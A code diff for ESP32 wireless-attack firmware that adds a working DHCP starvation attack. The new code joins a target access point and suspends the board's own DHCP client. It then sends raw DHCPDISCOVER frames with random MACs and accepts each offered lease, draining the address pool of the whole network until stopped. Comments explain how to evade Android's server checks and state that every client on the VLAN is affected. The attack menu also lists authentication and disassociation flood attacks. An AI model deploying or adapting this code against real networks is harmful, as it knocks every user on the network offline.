@@ -7,8 +7,15 @@
 #include "wifi_atks.h"
 
 #include <WiFi.h>
+#include <esp_netif.h>
+#include <esp_netif_net_stack.h>
 #include <esp_wifi.h>
 #include <globals.h>
+#include <lwip/inet.h>
+#include <lwip/netif.h>
+#include <lwip/pbuf.h>
+#include <lwip/sockets.h>
+#include <sys/select.h>
 
 extern bool showHiddenNetworks;
 
@@ -251,6 +258,7 @@ struct MoreAp {
     uint8_t bssid[6];
     uint8_t channel;
     String ssid;
+    uint8_t auth = 0;
 };
 
 static int moreScanAps(std::vector<MoreAp> &aps, int maxAps = 24) {
@@ -263,6 +271,7 @@ static int moreScanAps(std::vector<MoreAp> &aps, int maxAps = 24) {
         memcpy(ap.bssid, WiFi.BSSID(i), 6);
         ap.channel = ch;
         ap.ssid = WiFi.SSID(i);
+        ap.auth = (uint8_t)WiFi.encryptionType(i);
         aps.push_back(ap);
     }
     WiFi.scanDelete();
@@ -633,6 +642,341 @@ MoreAtkResult more_disassoc_attack(
 }
 
 // ============================================================================
+// DHCP starvation
+// ============================================================================
+
+/// DHCPDISCOVER on the wire: BOOTP fixed block + magic cookie + option 53 + end.
+///
+/// Same layout the Ethernet DHCPStarvation attack builds (op/htype/hlen, the
+/// broadcast flag, zeroed addresses, chaddr at offset 28, cookie at 236). It is
+/// wrapped in Ethernet/IPv4/UDP by moreSendDhcpFrame() below, because on Wi-Fi
+/// the frame has to come from the associated station itself.
+#define MORE_DHCP_DISCOVER_LEN 244
+
+static size_t moreBuildDhcpDiscover(uint8_t *out, size_t cap, const uint8_t chaddr[6]) {
+    if (out == NULL || chaddr == NULL || cap < MORE_DHCP_DISCOVER_LEN) return 0;
+    memset(out, 0, MORE_DHCP_DISCOVER_LEN);
+    out[0] = 0x01; // BOOTREQUEST
+    out[1] = 0x01; // Ethernet
+    out[2] = 0x06; // hardware address length
+    uint32_t xid = (uint32_t)random(0x7FFFFFFF);
+    out[4] = (uint8_t)(xid >> 24);
+    out[5] = (uint8_t)(xid >> 16);
+    out[6] = (uint8_t)(xid >> 8);
+    out[7] = (uint8_t)xid;
+    // Broadcast flag: this chaddr is not the radio's MAC, so only a broadcast
+    // OFFER can ever be delivered back to us.
+    out[10] = 0x80;
+    out[11] = 0x00;
+    memcpy(out + 28, chaddr, 6);
+    out[236] = 0x63; // magic cookie
+    out[237] = 0x82;
+    out[238] = 0x53;
+    out[239] = 0x63;
+    out[240] = 0x35; // option 53: DHCP message type
+    out[241] = 0x01;
+    out[242] = 0x01; // DHCPDISCOVER
+    out[243] = 0xFF; // end
+    return MORE_DHCP_DISCOVER_LEN;
+}
+
+/// DHCP option lookup in a BOOTP packet (options start at offset 240).
+static bool moreDhcpOption(const uint8_t *pkt, size_t len, uint8_t code, const uint8_t **val, size_t *vlen) {
+    if (pkt == NULL || len < 240) return false;
+    size_t i = 240;
+    while (i < len) {
+        uint8_t c = pkt[i++];
+        if (c == 0xFF) break;
+        if (c == 0) continue;
+        if (i >= len) break;
+        uint8_t l = pkt[i++];
+        if (i + l > len) break;
+        if (c == code) {
+            if (val) *val = pkt + i;
+            if (vlen) *vlen = l;
+            return true;
+        }
+        i += l;
+    }
+    return false;
+}
+
+#define MORE_DHCP_SELECT_LEN 256
+
+/// DHCPREQUEST that selects the lease the server just offered: same xid and
+/// chaddr as the DISCOVER, option 50 = offered address, option 54 = server id.
+/// Android NAKs an INIT-REBOOT request for an address it did not offer, so the
+/// offer has to be answered, not guessed.
+static size_t moreBuildDhcpSelect(
+    uint8_t *out, size_t cap, const uint8_t chaddr[6], uint32_t xid, uint32_t yiaddr, const uint8_t sid[4]
+) {
+    if (out == NULL || chaddr == NULL || sid == NULL || cap < MORE_DHCP_SELECT_LEN) return 0;
+    if (moreBuildDhcpDiscover(out, MORE_DHCP_SELECT_LEN, chaddr) == 0) return 0;
+    out[4] = (uint8_t)(xid >> 24);
+    out[5] = (uint8_t)(xid >> 16);
+    out[6] = (uint8_t)(xid >> 8);
+    out[7] = (uint8_t)xid;
+    out[242] = 0x03; // DHCPREQUEST
+    size_t i = 243;
+    out[i++] = 0x32; // option 50: requested IP address
+    out[i++] = 0x04;
+    memcpy(out + i, &yiaddr, 4);
+    i += 4;
+    out[i++] = 0x36; // option 54: server identifier
+    out[i++] = 0x04;
+    memcpy(out + i, sid, 4);
+    i += 4;
+    out[i++] = 0xFF; // end
+    return i;
+}
+
+/// Pull the offered address and server id out of a broadcast DHCPOFFER.
+static bool moreParseDhcpOffer(
+    const uint8_t *pkt, int len, uint32_t xid, uint32_t *yiaddr, uint8_t sid[4]
+) {
+    if (pkt == NULL || len < 244 || pkt[0] != 0x02) return false; // BOOTREPLY
+    const uint32_t rxid = ((uint32_t)pkt[4] << 24) | ((uint32_t)pkt[5] << 16) | ((uint32_t)pkt[6] << 8) | pkt[7];
+    if (rxid != xid) return false;
+    const uint8_t *v = NULL;
+    size_t vlen = 0;
+    if (!moreDhcpOption(pkt, (size_t)len, 53, &v, &vlen) || vlen != 1 || v[0] != 0x02) return false;
+    memcpy(yiaddr, pkt + 16, 4);
+    if (moreDhcpOption(pkt, (size_t)len, 54, &v, &vlen) && vlen == 4) memcpy(sid, v, 4);
+    else memset(sid, 0, 4);
+    return true;
+}
+
+/// One's-complement checksum; `sum` seeds it for the UDP pseudo-header.
+static uint16_t moreChecksum(const uint8_t *data, size_t len, uint32_t sum) {
+    for (size_t i = 0; i + 1 < len; i += 2) sum += ((uint16_t)data[i] << 8) | data[i + 1];
+    if (len & 1) sum += (uint16_t)data[len - 1] << 8;
+    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
+    return (uint16_t)~sum;
+}
+
+/// The station netif lwIP hands frames to.
+static struct netif *moreStaNetif() {
+    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    return sta ? (struct netif *)esp_netif_get_netif_impl(sta) : NULL;
+}
+
+/// Wrap a DHCP datagram in Ethernet/IPv4/UDP and send it from the joined
+/// station, source 0.0.0.0:68. A plain socket cannot be used: it gets an
+/// ephemeral port (Android drops anything but 68) and port 68 cannot be bound
+/// while the station's own DHCP client holds it. Raw frames leave that client,
+/// its address and its route untouched.
+static bool moreSendDhcpFrame(struct netif *iface, const uint8_t *dhcp, size_t dhcpLen) {
+    if (iface == NULL || iface->linkoutput == NULL || dhcp == NULL || dhcpLen == 0) return false;
+    const size_t ipLen = 20 + 8 + dhcpLen;
+    const size_t frameLen = 14 + ipLen;
+    if (frameLen > 0xFFFF) return false;
+
+    struct pbuf *p = pbuf_alloc(PBUF_RAW, frameLen, PBUF_RAM);
+    if (p == NULL) return false;
+    uint8_t *frame = (uint8_t *)p->payload;
+
+    memset(frame, 0xFF, 6);              // broadcast to the AP's DHCP server
+    memcpy(frame + 6, iface->hwaddr, 6); // the associated station
+    frame[12] = 0x08;
+    frame[13] = 0x00; // IPv4
+
+    uint8_t *ip = frame + 14;
+    memset(ip, 0, 20 + 8);
+    ip[0] = 0x45; // IPv4, 20-byte header
+    ip[2] = (uint8_t)(ipLen >> 8);
+    ip[3] = (uint8_t)ipLen;
+    ip[8] = 64; // TTL
+    ip[9] = 17; // UDP
+    memset(ip + 16, 0xFF, 4); // 255.255.255.255
+    uint16_t ipCk = moreChecksum(ip, 20, 0);
+    ip[10] = (uint8_t)(ipCk >> 8);
+    ip[11] = (uint8_t)ipCk;
+
+    uint8_t *udp = ip + 20;
+    udp[1] = 68; // DHCP client port; servers drop anything else
+    udp[3] = 67; // DHCP server port
+    uint16_t udpLen = (uint16_t)(8 + dhcpLen);
+    udp[4] = (uint8_t)(udpLen >> 8);
+    udp[5] = (uint8_t)udpLen;
+    memcpy(udp + 8, dhcp, dhcpLen);
+    uint32_t pseudo = 0xFFFF + 0xFFFF; // destination 255.255.255.255
+    pseudo += 17;                      // UDP protocol
+    pseudo += udpLen;
+    uint16_t udpCk = moreChecksum(udp, udpLen, pseudo);
+    if (udpCk == 0) udpCk = 0xFFFF;
+    udp[6] = (uint8_t)(udpCk >> 8);
+    udp[7] = (uint8_t)udpCk;
+
+    err_t err = iface->linkoutput(iface, p);
+    pbuf_free(p);
+    return err == ERR_OK;
+}
+
+MoreAtkResult more_dhcp_starvation(
+    const uint8_t bssid[6], const String &ssid, const String &password, uint8_t channel, uint32_t durationMs,
+    const MoreProgressFn &progress, bool untilBack
+) {
+    MoreAtkResult res;
+    // Until-BACK mode ignores the duration and the "no offers" stop: the menu
+    // entry holds the selected AP's pool (one VLAN) down for as long as the
+    // operator wants, and only the BACK button ends it.
+    if (!untilBack && durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
+    if (!untilBack && durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;
+    if (ssid.length() == 0) {
+        res.error = "AP has no SSID";
+        return res;
+    }
+    if (channel < 1 || channel > 14) {
+        res.error = "channel must be 1-14";
+        return res;
+    }
+
+    // Report the target even when the join never happens: a failed console run
+    // used to print channel=0 and an empty detail, which says nothing about
+    // which AP was tried.
+    res.channel = channel;
+    res.detail = ssid.substring(0, 24);
+    uint32_t startedAll = millis();
+
+    // Joining is part of the attack, not a convenience: a DHCP server only sees
+    // traffic the AP forwards for an associated station, so the spoofed frames
+    // the other attacks send cannot reach it. GhostESP does it the same way -
+    // establish one real link, then vary chaddr per DISCOVER.
+    //
+    // If the board is already on this SSID, keep that link: re-joining costs
+    // seconds, may pick another channel, and drops a connection the user may be
+    // using - the DHCP server is the same one either way. This mirrors
+    // wifi_atk_unsetWifi(), which also leaves a pre-existing connection up.
+    const bool alreadyJoined = WiFi.isConnected() && WiFi.SSID() == ssid;
+    if (!alreadyJoined) {
+        if (!wifiEnsureRadioMem()) {
+            res.error = "low RAM for wifi";
+            return res;
+        }
+        if (!_connectToWifiNetwork(ssid, password, channel, bssid)) {
+            res.error = "join failed (password/range)";
+            res.seconds = (millis() - startedAll) / 1000;
+            wifiDisconnect();
+            return res;
+        }
+    }
+
+    // Android's DHCP server drops packets that do not come from UDP port 68 and
+    // NAKs a REQUEST for an address it did not offer ("Invalid requested
+    // address"), so this has to be the real handshake: DISCOVER with a fresh
+    // chaddr, read the OFFER, then REQUEST that exact address with the same
+    // chaddr. Port 68 is held by the station's DHCP client, so stop it, put the
+    // same address back as a static configuration (the receive socket needs a
+    // non-zero netif address to accept broadcasts), and restart it afterwards.
+    struct netif *iface = moreStaNetif();
+    if (iface == NULL || iface->linkoutput == NULL) {
+        res.error = "no station netif";
+        res.seconds = (millis() - startedAll) / 1000;
+        if (!alreadyJoined) wifiDisconnect();
+        return res;
+    }
+
+    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    bool dhcpcStopped = false;
+    if (sta) {
+        esp_netif_ip_info_t saved;
+        bool haveSaved = (esp_netif_get_ip_info(sta, &saved) == ESP_OK && saved.ip.addr != 0);
+        dhcpcStopped = (esp_netif_dhcpc_stop(sta) == ESP_OK);
+        if (haveSaved) esp_netif_set_ip_info(sta, &saved);
+    }
+
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (sock < 0) {
+        res.error = "udp socket failed";
+        res.seconds = (millis() - startedAll) / 1000;
+        if (dhcpcStopped) esp_netif_dhcpc_start(sta);
+        if (!alreadyJoined) wifiDisconnect();
+        return res;
+    }
+    int one = 1;
+    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one));
+    struct sockaddr_in src;
+    memset(&src, 0, sizeof(src));
+    src.sin_family = AF_INET;
+    src.sin_port = htons(68); // DHCP client port
+    src.sin_addr.s_addr = htonl(INADDR_ANY);
+    if (bind(sock, (struct sockaddr *)&src, sizeof(src)) != 0) {
+        res.error = "bind dhcp port 68 failed";
+        res.seconds = (millis() - startedAll) / 1000;
+        close(sock);
+        if (dhcpcStopped) esp_netif_dhcpc_start(sta);
+        if (!alreadyJoined) wifiDisconnect();
+        return res;
+    }
+
+    EscPress = false;
+    uint32_t start = millis();
+    uint32_t lastTick = 0;
+    uint32_t noOffer = 0;
+    uint8_t disc[MORE_DHCP_DISCOVER_LEN];
+    uint8_t req[MORE_DHCP_SELECT_LEN];
+    uint8_t reply[600];
+
+    while (!EscPress && (untilBack || moreTimeLeft(start, durationMs))) {
+        uint8_t chaddr[6];
+        moreRandomMac(chaddr);
+        size_t dlen = moreBuildDhcpDiscover(disc, sizeof(disc), chaddr);
+        const uint32_t xid =
+            ((uint32_t)disc[4] << 24) | ((uint32_t)disc[5] << 16) | ((uint32_t)disc[6] << 8) | disc[7];
+        if (!moreSendDhcpFrame(iface, disc, dlen)) {
+            res.error = "raw send failed";
+            break;
+        }
+        res.frames++;
+
+        bool gotOffer = false;
+        uint32_t yiaddr = 0;
+        uint8_t sid[4] = {0};
+        // The AP answers in well under a millisecond; the 25 ms budget also
+        // paces the loop at about 40 handshakes per second.
+        for (int wait = 0; wait < 5 && !gotOffer; wait++) {
+            fd_set rfds;
+            FD_ZERO(&rfds);
+            FD_SET(sock, &rfds);
+            struct timeval tv;
+            tv.tv_sec = 0;
+            tv.tv_usec = 5000;
+            if (select(sock + 1, &rfds, NULL, NULL, &tv) <= 0) continue;
+            struct sockaddr_in from;
+            socklen_t fromLen = sizeof(from);
+            int n = recvfrom(sock, reply, sizeof(reply), 0, (struct sockaddr *)&from, &fromLen);
+            if (n > 0 && moreParseDhcpOffer(reply, n, xid, &yiaddr, sid)) gotOffer = true;
+        }
+        if (gotOffer) {
+            noOffer = 0;
+            size_t rlen = moreBuildDhcpSelect(req, sizeof(req), chaddr, xid, yiaddr, sid);
+            if (rlen != 0 && moreSendDhcpFrame(iface, req, rlen)) res.frames++;
+        } else if (!untilBack && ++noOffer >= 200) {
+            // A /24 with 200 clients has only a handful of free leases; once the
+            // server stops offering there is nothing left to commit. 200 quiet
+            // attempts is about five seconds, short enough not to stall a sweep
+            // and long enough to ride out a lost packet or two.
+            res.detail += " (no offers)";
+            break;
+        }
+        if (EscPress) break;
+        moreTick(res.frames, start, progress, lastTick);
+    }
+
+    if (untilBack && EscPress) res.detail += " (BACK)";
+    close(sock);
+    if (dhcpcStopped) esp_netif_dhcpc_start(sta);
+    if (!alreadyJoined) wifiDisconnect();
+
+    res.targets = 1;
+    res.ok = (res.error == nullptr);
+    // The wall clock of the whole attempt, join included. The send loop keeps
+    // its own `start`, which is the duration the caller asked for.
+    res.seconds = (millis() - startedAll) / 1000;
+    return res;
+}
+
+// ============================================================================
 // Shared helpers for the menu and the console
 // ============================================================================
 
@@ -653,13 +997,14 @@ const char *moreTargetAtkName(int id) {
         case 2: return "Bad Message";
         case 3: return "Authentication Attack";
         case 4: return "Disassociation Attack";
+        case 5: return "DHCP Starvation";
         default: return "Unknown";
     }
 }
 
 MoreAtkResult moreRunTargetAtk(
     int id, const String &ssid, const String &mac, uint8_t channel, uint8_t newChannel, uint32_t durationMs,
-    const MoreProgressFn &progress
+    const MoreProgressFn &progress, const String &password
 ) {
     uint8_t bssid[6];
     if (!moreParseMac(mac, bssid)) {
@@ -673,6 +1018,7 @@ MoreAtkResult moreRunTargetAtk(
         case 2: return more_bad_message(bssid, channel, durationMs, progress);
         case 3: return more_auth_attack(bssid, channel, durationMs, progress);
         case 4: return more_disassoc_attack(bssid, channel, durationMs, progress);
+        case 5: return more_dhcp_starvation(bssid, ssid, password, channel, durationMs, progress);
         default: {
             MoreAtkResult res;
             res.error = "unknown attack";
@@ -775,6 +1121,42 @@ void moreTargetAuthAttack(const String &tssid, const String &mac, uint8_t channe
 
 void moreTargetDisassoc(const String &tssid, const String &mac, uint8_t channel) {
     moreRunTargetUi(4, tssid, mac, channel, 0);
+}
+
+// DHCP starvation needs a station link, so it asks for the AP password only when
+// the board does not already have one for this SSID - the same saved-password-
+// first rule every other connect path uses.
+void moreTargetDhcpStarve(const String &tssid, const String &mac, uint8_t channel) {
+    String pass = bruceConfig.getWifiPassword(tssid);
+    if (pass.length() == 0) {
+        pass = keyboard(pass, 63, "AP Password (empty=open):", true);
+        if (pass == "\x1B") return;
+    }
+
+    uint8_t bssid[6];
+    if (!moreParseMac(mac, bssid)) {
+        MoreAtkResult bad;
+        bad.error = "invalid BSSID";
+        moreResultScreen("DHCP Starvation", bad);
+        return;
+    }
+
+    uint32_t t0 = millis();
+    // Pool-wide, not per-client: every lease comes out of the selected AP's
+    // DHCP pool, which is the VLAN's pool, so every client on that network is
+    // affected. It runs until BACK; there is no fixed duration.
+    moreStatusScreen("DHCP Starvation", tssid, "Whole VLAN - BACK to stop");
+    MoreAtkResult r = more_dhcp_starvation(
+        bssid, tssid, pass, channel, 0, moreMenuProgress("DHCP Starvation", tssid), true
+    );
+    r.seconds = (millis() - t0) / 1000;
+    // The menu result is otherwise invisible over USB; print it so a run can be
+    // confirmed (and a BACK stop shows its duration) from the console.
+    serialDevice->println(
+        String("RESULT name=dhcpstarve menu=1 ok=") + (r.ok ? "1" : "0") + " frames=" + String(r.frames) +
+        " seconds=" + String(r.seconds) + " detail=" + r.detail + " error=" + (r.error ? r.error : "-")
+    );
+    moreResultScreen("DHCP Starvation", r);
 }
 
 // The flood attacks used to live in a nested "More Attacks" page. They are now
